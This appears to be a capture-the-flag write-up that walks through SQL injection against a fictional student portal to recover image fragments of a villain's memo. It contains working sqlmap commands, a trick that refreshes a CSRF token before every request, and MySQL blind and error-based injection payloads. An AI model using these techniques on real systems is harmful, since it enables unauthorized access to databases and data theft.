# Retrieve Scraps of paper from Server

Looking at the website we see 2 pages that look like they use SQL: You can submit an application, `/apply.php`, or you can check the status, `check.php`. Thinking about how these work, applying probably runs some INSERT statement, whereas check is probably a SELECT statement. Since injecting into SELECT statements is more common, it's also easier to do with a lot of tools. so we'll focus on this form.

First we need to know how the form works, so we can open burp, set the proxy, etc. and submit the form with some example data.

We see 2 requests after we submit the form:

```
> GET /validator.php HTTP/1.1
> Host: studentportal.elfu.org
> Accept: */*
> Referer: https://studentportal.elfu.org/check.php

< HTTP/1.1 200 OK
< Content-Type: text/html; charset=UTF-8
< X-Powered-By: PHP/7.2.1
< 
< MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY=_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg==
< 

> GET /application-check.php?elfmail=krampus%40elfu.ac&token=MTAwOTU3NjU3MjE2MTU3NzQ2MzM5NDEwMDk1NzY1Ny4yMTY%3D_MTI5MjI1ODAxMjM2NDgzMjMwNjQ1MDMwLjkxMg%3D%3D HTTP/1.1
> Host: studentportal.elfu.org
> Accept: */*
> Referer: https://studentportal.elfu.org/check.php

< [...]

```

(trimmed)

The actual form goes in the second request as GET parameter `elfmail`. We also have a `token` value that's just the response from `validator.php`. If we try to reuse this for another request we get the message 'Invalid or expired token!', so this is some CSRF token that we need to populate each request.

Let's run sqlmap against it. A start would be:

```
sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=AAA&token=BBB'
```

But of course we need to update the CSRF token. SQLMap has built in parameters `--csrf-token` and `--csrf-url` for doing this, so it seems like we should be able to do this:

```
sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=AAA&token=BBB' --csrf-token 'token' --csrf-url 'https://studentportal.elfu.org/validator.php'
```

But we get this error:

```
[..:..:..] [CRITICAL] anti-CSRF token 'token' can't be found at 'https://studentportal.elfu.org/validator.php'
```

So it seems like it's looking for the token to be as an `<input>` or as a URL param. This isn't going to work, so we'll have to manipulate the token value some other way. From the SQLMap docs:

```
Option: --eval

In case that user wants to change (or add new) parameter values, most probably because of some known dependency, he can provide to sqlmap a custom python code with option --eval that will be evaluated just before each request.

$ python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b9238\
20dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
```

So we need to make a GET request then set the token to the response:

```python
import requests
token = requests.get('https://studentportal.elfu.org/validator.php').text
```

Then set that as the eval function:

```
$ sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=AAA&token=BBB' --eval 'import requests; token = requests.get('https://studentportal.elfu.org/validator.php').text'

[...]

sqlmap identified the following injection point(s) with a total of 189 HTTP(s) requests:
---
Parameter: elfmail (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: elfmail=AAA' AND 3693=3693 AND 'ObJp'='ObJp&token=AAA

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: elfmail=AAA' AND (SELECT 4447 FROM(SELECT COUNT(*),CONCAT(0x716b627871,(SELECT (ELT(4447=4447,1))),0x7170707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ByHL'='ByHL&token=AAA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: elfmail=AAA' AND (SELECT 3959 FROM (SELECT(SLEEP(5)))cRnI) AND 'gKPu'='gKPu&token=AAA
---

```

Now we can start looking at the databaes. We can enumerate the following tables:

```
$ sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=AAA&token=BBB' --eval 'import requests; token = requests.get('https://studentportal.elfu.org/validator.php').text' --tables

[..:..:..] [WARNING] user aborted during enumeration. sqlmap will display partial output
Database: elfu
[3 tables]
+---------------------------------------+
| applications                          |
| krampus                               |
| students                              |
+---------------------------------------+

Database: information_schema
[8 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
+---------------------------------------+
```

Let's dump the contents of the `krampus` table:

```
$ sqlmap -u 'https://studentportal.elfu.org/application-check.php?elfmail=AAA&token=BBB' --eval 'import requests; token = requests.get('https://studentportal.elfu.org/validator.php').text' -T krampus --dump

Database: elfu
Table: krampus
[6 entries]
+----+-----------------------+
| id | path                  |
+----+-----------------------+
| 1  | /krampus/0f5f510e.png |
| 2  | /krampus/1cc7e121.png |
| 3  | /krampus/439f15e6.png |
| 4  | /krampus/667d6896.png |
| 5  | /krampus/adb798ca.png |
| 6  | /krampus/ba417715.png |
+----+-----------------------+
```

Each of these paths is an image on the server, all of which seem to be a fragment of paper. We can piece these together and see the final message:

```

From the desk of ....
Date: August 23, 20...

Memo to Self:

Finally! I've figured out how to destroy Christmas!
Santa has a brand new, cutting edge sleigh guidance technology, called the Super Sled-o-matic.

I've figured out a way to poison the data going into the system so that it will divert Santa's sled on Christmas Eve!

Santa will be unable to make the trip and the holiday season will be destroyed! Santa's own technology will undermine him!

That's what they deserve for not listening to my suggestions for supporting other holiday characters!

Bwahahahahaha!
```

